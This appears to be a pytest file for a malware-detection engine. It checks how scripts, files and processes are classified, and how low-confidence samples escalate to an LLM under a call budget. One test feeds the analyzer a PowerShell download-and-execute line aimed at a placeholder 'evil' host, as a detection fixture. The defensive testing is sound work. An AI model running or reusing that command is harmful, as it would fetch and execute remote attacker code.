"""深度分析流水线测试：文件/进程/脚本 判定 + 低置信样本 LLM 升级链路"""
from winapp_migrator.core.security_engine.config import config
from winapp_migrator.core.security_engine.deep_analyze import DeepAnalyzer


def test_script_malicious():
    d = DeepAnalyzer()
    res = d.analyze_script("Invoke-Expression (DownloadString('http://evil/a'))")
    assert res["verdict"] == "malicious"
    assert "script.liveload" in res["signals"]


def test_script_clean():
    d = DeepAnalyzer()
    res = d.analyze_script("def add(a, b):\n    return a + b\n")
    assert res["verdict"] == "clean"


def test_file_ransom_extension(tmp_path):
    d = DeepAnalyzer()
    p = tmp_path / "doc.locked"
    p.write_bytes(b"encrypted noise " * 50)
    res = d.analyze_file(str(p))
    assert res["verdict"] == "malicious"
    assert "file.ransom_extension" in res["signals"]


def test_process_sample_shape(tmp_path):
    d = DeepAnalyzer()
    p = tmp_path / "tool.exe"
    p.write_bytes(b"MZ" + b"\x00" * 200)   # 非完整 PE → pe=False
    res = d.analyze_process({"pid": 1, "name": "tool.exe", "path": str(p)})
    assert set(res) >= {"verdict", "confidence", "signals", "reason"}
    assert res["verdict"] in ("clean", "suspicious", "malicious")


def test_llm_escalation(monkeypatch):
    """低置信样本（suspicious）经 LLM 二次判定升级为 malicious"""
    d = DeepAnalyzer()
    script = "Q" * 300   # 高 base64 占比 + 超长 → script.obfuscation(55) → suspicious，不触发高置信规则
    # 先禁用 LLM（resolve_cfg=None）：确定性回到规则判定 suspicious，不发起真实网络请求
    monkeypatch.setattr("winapp_migrator.core.security_engine.llm_analyzer.resolve_cfg",
                        lambda: None)
    res = d.analyze_script(script)
    assert res["verdict"] == "suspicious", res

    def fake_cfg():
        return {"enabled": True, "base_url": "http://127.0.0.1:1/v1",
                "api_key": "k", "model": "m", "timeout_s": 1.0}

    def fake_analyze(sample, cfg):
        return {"verdict": "malicious", "confidence": 90, "reason": "测试判定"}

    monkeypatch.setattr("winapp_migrator.core.security_engine.llm_analyzer.analyze", fake_analyze)
    monkeypatch.setattr("winapp_migrator.core.security_engine.llm_analyzer.resolve_cfg", fake_cfg)
    res2 = d.analyze_script(script)
    assert res2["verdict"] == "malicious"
    assert "LLM" in res2["reason"]


def test_trusted_signer_skips_llm(tmp_path, monkeypatch):
    """签名厂商可信 → 直接 clean，不触发 LLM"""
    signature = __import__("winapp_migrator.core.security_engine.signature",
                           fromlist=["signer_subject"])
    monkeypatch.setattr(signature, "signer_subject", lambda p: "Microsoft Corporation")
    p = tmp_path / "app.exe"
    p.write_bytes(b"MZ" + b"\x00" * 64)
    d = DeepAnalyzer()
    # 手工构造带 pe=True 的样本，命中签名分支（文件存在即可，无需真实 PE 结构）
    sample = d.sample_file(str(p))
    sample["pe"] = True
    res = d.analyze(sample, category="file")
    assert res["verdict"] == "clean"
    assert "签名厂商可信" in res["reason"]


def test_budget_limits_llm(monkeypatch):
    """单轮扫描 LLM 调用预算：超限降级为规则判定（不再调 LLM）"""
    calls = {"n": 0}

    def fake_cfg():
        return {"enabled": True, "base_url": "http://127.0.0.1:1/v1",
                "api_key": "k", "model": "m", "timeout_s": 1.0}

    def fake_analyze(sample, cfg):
        calls["n"] += 1
        return {"verdict": "malicious", "confidence": 90, "reason": "x"}

    monkeypatch.setattr("winapp_migrator.core.security_engine.llm_analyzer.analyze", fake_analyze)
    monkeypatch.setattr("winapp_migrator.core.security_engine.llm_analyzer.resolve_cfg", fake_cfg)
    monkeypatch.setitem(config.data.setdefault("llm", {}), "max_calls_per_scan", 1)
    d = DeepAnalyzer()
    script = "Q" * 300
    d.analyze_script(script)
    d.analyze_script("R" * 300)   # 不同内容 → 需再次判定
    assert calls["n"] == 1   # 预算 1，第二次调用被截断
    d.end_scan()
    d.analyze_script("S" * 300)
    assert calls["n"] == 2   # 重置后恢复